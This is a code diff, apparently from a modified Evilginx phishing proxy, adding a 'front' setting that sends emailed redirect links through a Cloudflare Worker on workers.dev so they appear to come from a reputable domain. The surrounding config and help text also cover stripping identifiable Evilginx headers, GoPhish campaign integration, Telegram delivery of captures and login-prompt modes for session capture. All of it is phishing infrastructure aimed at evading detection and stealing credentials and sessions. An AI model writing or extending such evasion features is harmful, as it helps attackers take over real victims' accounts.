@@ -247,8 +247,9 @@ func (t *Terminal) handleConfig(args []string) error {
 			forceLoginDisplay = "on (prompt=" + t.cfg.GetLoginPrompt() + ")"
 		}
 		loginPromptDisplay := t.cfg.GetLoginPrompt() + " (off = session-only anonymous capture)"
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "unauth_redirect", "force_login", "login_prompt", "autocert", "strip_headers", "dashboard_sub", "dashboard_user", "dashboard_pass", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken", "turnstile"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, unauthRedirectDisplay, forceLoginDisplay, loginPromptDisplay, autocertOnOff, t.cfg.GetStripHeadersStatus(), dashSub, dashUser, dashPassDisplay, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken, turnstileDisplay}
+		frontDisplay := t.cfg.GetFront() + " (redirect pages may use a workers.dev link) "
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "unauth_redirect", "force_login", "login_prompt", "front", "autocert", "strip_headers", "dashboard_sub", "dashboard_user", "dashboard_pass", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken", "turnstile"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, unauthRedirectDisplay, forceLoginDisplay, loginPromptDisplay, frontDisplay, autocertOnOff, t.cfg.GetStripHeadersStatus(), dashSub, dashUser, dashPassDisplay, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken, turnstileDisplay}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -351,6 +352,11 @@ func (t *Terminal) handleConfig(args []string) error {
 		case "login_prompt":
 			if err := t.cfg.SetLoginPrompt(args[1]); err != nil {
 				return fmt.Errorf("%v (usage: config login_prompt off|login|select_account)", err)
+			}
+			return nil
+		case "front":
+			if err := t.cfg.SetFront(args[1]); err != nil {
+				return fmt.Errorf("%v (usage: config front on|off)", err)
 			}
 			return nil
 		case "unauth_redirect":
@@ -1893,6 +1899,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("strip_headers", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("force_login", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("login_prompt", readline.PcItem("off"), readline.PcItem("login"), readline.PcItem("select_account")),
+			readline.PcItem("front", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("unauth_redirect", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("test"))))
@@ -1912,6 +1919,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"strip_headers"}, "strip_headers <on|off>", "enable or disable removal of identifiable Evilginx headers (X-Evilginx, Via, X-Forwarded-*, etc.) from all requests and responses")
 
 	h.AddSubCommand("config", []string{"login_prompt"}, "login_prompt <off|login|select_account>", "what the provider is asked to show: off = never prompt (session-only anonymous capture), login = always ask for credentials, select_account = show the account picker so a returning visitor picks their tile and skips typing the email")
+	h.AddSubCommand("config", []string{"front"}, "front <on|off>", "route redirect-page public links through a Cloudflare Worker on your workers.dev domain (reputable domain for the emailed link). off keeps the plain subdomain links")
 	h.AddSubCommand("config", []string{"force_login"}, "force_login <on|off>", "legacy alias of login_prompt: on = login, off = off")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
